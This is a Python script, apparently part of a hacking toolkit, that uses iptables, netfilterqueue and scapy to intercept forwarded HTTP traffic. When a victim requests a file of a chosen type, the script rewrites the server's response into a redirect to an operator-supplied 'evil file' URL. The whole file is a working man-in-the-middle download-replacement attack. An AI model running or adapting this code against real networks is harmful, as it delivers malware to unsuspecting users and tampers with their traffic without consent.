import subprocess
import netfilterqueue
import scapy.all as scapy

from Utils import Terminal

subprocess.run("iptables --flush", check=True, shell=True)

# Production 
subprocess.run("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", check=True, shell=True)

# Development
# subprocess.run("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", check=True, shell=True)
# subprocess.run("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", check=True, shell=True)

ack_list = []
queue = netfilterqueue.NetfilterQueue()

file = ""
file_url = ""


def set_url(packet, url):
        packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently \nLocation: {url}"
        print(packet[scapy.Raw].load)
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet


def process_packet(packet):
        global file
        global file_url

        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                if file in str(scapy_packet[scapy.Raw].load): # Replace file extension to one of your choice
                    print("File found -->> \n")
                    ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file =>>")
                    modified_packet = set_url(scapy_packet, file_url)
                    packet.set_payload(bytes(modified_packet))

        packet.accept()
    

def run():
    global file
    global file_url

    Terminal.clear()

    file = input("Enter file type or name (eg: .zip/myfile.zip): ")
    file_url = input("Enter url of the evil file: ")
    
    queue.bind(0, process_packet)
    queue.run()
